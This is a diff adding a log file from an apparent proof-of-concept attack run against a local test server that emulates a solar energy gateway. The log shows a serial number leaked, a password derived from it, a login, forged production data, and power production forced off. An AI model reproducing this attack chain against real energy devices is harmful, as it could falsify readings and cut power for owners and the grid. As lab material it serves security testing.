@@ -1,0 +1,18 @@
+2025-06-25 10:14:32,107 [INFO] - [*] Running spoof attack...
+2025-06-25 10:14:32,112 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:34,162 [DEBUG] - http://localhost:5000 "GET /info HTTP/1.1" 200 83
+2025-06-25 10:14:34,164 [INFO] - [+] Serial number leaked: 1234567890ENPH
+2025-06-25 10:14:34,165 [INFO] - [+] Derived password: 9448343b
+2025-06-25 10:14:34,167 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:36,213 [DEBUG] - http://localhost:5000 "POST /api/login HTTP/1.1" 200 29
+2025-06-25 10:14:36,215 [INFO] - [+] Auth token received: authtok_9448343b
+2025-06-25 10:14:36,218 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:14:38,261 [DEBUG] - http://localhost:5000 "POST /api/spoof HTTP/1.1" 200 34
+2025-06-25 10:14:38,262 [INFO] - [+] Successfully spoofed production data.
+2025-06-25 10:15:05,579 [INFO] - [*] Running power disable attack...
+2025-06-25 10:15:05,583 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:15:07,639 [DEBUG] - http://localhost:5000 "POST /ivp/mod/603980032/mode/power HTTP/1.1" 200 52
+2025-06-25 10:15:07,641 [INFO] - [+] Power production disabled successfully.
+2025-06-25 10:15:07,642 [DEBUG] - Starting new HTTP connection (1): localhost:5000
+2025-06-25 10:15:09,685 [DEBUG] - http://localhost:5000 "GET /ivp/mod/603980032/mode/power HTTP/1.1" 200 24
+2025-06-25 10:15:09,686 [INFO] - [*] Current power state: {'powerForcedOff': True}
